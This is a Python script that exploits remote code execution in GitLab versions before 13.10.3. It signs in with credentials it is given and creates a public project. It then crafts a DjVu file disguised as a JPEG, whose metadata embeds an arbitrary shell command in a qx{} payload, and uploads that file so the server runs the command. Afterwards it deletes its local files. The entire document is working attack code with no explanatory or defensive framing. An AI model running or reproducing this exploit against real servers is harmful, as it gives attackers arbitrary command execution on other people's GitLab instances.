import requests
from bs4 import BeautifulSoup
import base64
import random
import os
import argparse

parser = argparse.ArgumentParser(description='GitLab < 13.10.3 RCE')
parser.add_argument('-u', help='Username', required=True)
parser.add_argument('-p', help='Password', required=True)
parser.add_argument(
    '-t', help='URL (Eg: http://gitlab.example.com)', required=True)
parser.add_argument('-c', help='Command to execute', required=True)
args = parser.parse_args()
username = args.u
password = args.p
gitlab_url = args.t
command = args.c

session = requests.Session()

# Authenticating
print("[+] Authenticating")
r = session.get(gitlab_url + "/users/sign_in")
soup = BeautifulSoup(r.text, features="lxml")
token = soup.findAll('meta')[16].get("content")
login_form = {
    "authenticity_token": token,
    "user[login]": username,
    "user[password]": password,
    "user[remember_me]": "0"
}
r = session.post(f"{gitlab_url}/users/sign_in", data=login_form)
if r.status_code != 200:
    exit(f"[x] Login Failed:{r.text}")
else:
    print("[+] Successfully Authenticated")

# Creating Project
print("[+] Creating Project")
r = session.get(f"{gitlab_url}/projects/new")
soup = BeautifulSoup(r.text, features="lxml")
project_token = soup.findAll('meta')[16].get("content")
project_token = project_token.replace("==", "%3D%3D")
project_token = project_token.replace("+", "%2B")
project_name = f'project{random.randrange(1, 10000)}'
cookies = {'sidebar_collapsed': 'false', 'event_filter': 'all',
           'hide_auto_devops_implicitly_enabled_banner_1': 'false', "_gitlab_session": session.cookies["_gitlab_session"], }
payload = f"utf8=%E2%9C%93&authenticity_token={project_token}&project%5Bci_cd_only%5D=false&project%5Bname%5D={project_name}&project%5Bpath%5D={project_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=20"
r = session.post(gitlab_url+'/projects', data=payload,
                 cookies=cookies, verify=False)
if "The change you requested was rejected." in r.text:
    exit('[x] Exploit failed, check input params')
else:
    print("[+] Successfully created project")

# RCE Payload
rce_payload = f'(metadata\n\t(Copyright "\\\n" . qx{{{command}}} . \\\n" b ") )\n'.encode(
)
# Write payload to a text file
with open("rce.txt", "wb") as text_file:
    text_file.write(rce_payload)

# Create a djvu file with metadata payload, and then rename it to .jpg file
os.system(
    "djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt && mv rce.djvu rce.jpg")

# Upload file
try:
     r = session.get(f"{gitlab_url}/{username}/{project_name}/-/snippets/new", cookies=cookies)
     soup = BeautifulSoup(r.text, features="lxml")
     snippet_token = soup.findAll('meta')[16].get("content")
except IndexError as indexerror:
    # Add check for older gitlab versions
     r = session.get(f"{gitlab_url}/{username}/{project_name}/snippets/new", cookies=cookies)
     soup = BeautifulSoup(r.text, features="lxml")
     snippet_token = soup.findAll('meta')[16].get("content")

upload_file_url = f"{gitlab_url}/{username}/{project_name}/uploads"
cookies = {'sidebar_collapsed': 'false', 'event_filter': 'all',
           'hide_auto_devops_implicitly_enabled_banner_1': 'false', "_gitlab_session": session.cookies["_gitlab_session"], }

files = {"file": ("rce.jpg", open("rce.jpg", "rb"), "image/jpeg")}
resp = session.post(
    url=upload_file_url,
    files=files,
    headers={
        "X-CSRF-Token": snippet_token,
        "Referer": upload_file_url,
        "Accept": "application/json"
    }, cookies=cookies)

if "The change you requested was rejected." in resp.text:
    exit("[x] Upload file failed")
elif "Failed to process image" in resp.text:
    print("[+] RCE triggered successfully")

# Clean up
os.system("rm rce.jpg && rm rce.txt")
